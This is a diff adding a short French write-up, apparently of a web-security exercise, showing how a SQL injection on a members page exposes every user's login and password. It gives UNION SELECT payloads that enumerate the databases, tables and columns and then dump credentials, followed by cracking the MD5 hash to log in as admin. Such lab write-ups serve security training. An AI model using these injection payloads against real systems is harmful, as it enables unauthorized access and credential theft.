@@ -1,0 +1,12 @@
+Dans la page members, une faille sql permet de trouver les logins et les mots de passe de tous les users.
+
+On recupere toutes les bases de donnees :
+1 union select schema_name, catalog_name from information_schema.schemata
+
+On obtient le nom de toutes les colonnes et de toutes les tables :
+1 union select table_name, column_name from information_schema.columns
+
+On recupere les logins et les mots de passe :
+1 union select username, password from Member_Brute_Force.db_default
+
+Enfin, on fait un reverse hash (md5) du mot de passe pour trouver le mot de passe original et on se log avec le login (admin) et le mot de passe (shadow)
